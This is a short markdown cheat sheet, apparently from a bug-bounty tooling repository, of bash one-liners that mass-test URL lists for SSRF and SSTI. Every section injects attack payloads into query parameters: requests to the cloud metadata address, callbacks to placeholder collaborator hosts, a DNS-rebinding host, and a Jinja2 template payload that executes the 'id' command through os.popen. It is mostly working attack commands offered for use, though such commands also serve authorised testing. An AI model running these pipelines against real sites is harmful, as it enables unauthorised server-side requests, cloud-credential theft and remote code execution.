[← Back to README](../Readme.md)

---

## 🌐 SSRF & SSTI

### SSRF with Interactsh
```bash
cat urls.txt | gf ssrf | qsreplace "https://YOURBURP.oastify.com" | httpx -silent
```

### SSRF Parameter Fuzzing
```bash
cat urls.txt | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent -match-string "ami-id"
```

### SSTI Detection
```bash
cat urls.txt | gf ssti | qsreplace "{{7*7}}" | httpx -silent -match-string "49" | anew ssti_vuln.txt
```

### SSTI Payload Test
```bash
cat urls.txt | qsreplace '${7*7}' | httpx -silent -mr "49" && cat urls.txt | qsreplace '<%= 7*7 %>' | httpx -silent -mr "49"
```

### Full SSRF Chain
```bash
cat params.txt | grep -iE "(url|uri|path|src|dest|redirect|redir|return|next|target|out|view|page|show|fetch|load)" | qsreplace "http://YOURSERVER" | httpx -silent
```

### SSRF with DNS Rebinding
```bash
cat urls.txt | gf ssrf | qsreplace "http://7f000001.burpcollaborator.net" | httpx -silent
```

### Jinja2 SSTI
```bash
cat urls.txt | qsreplace "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}" | httpx -silent
```

---

[← Back to README](../Readme.md)
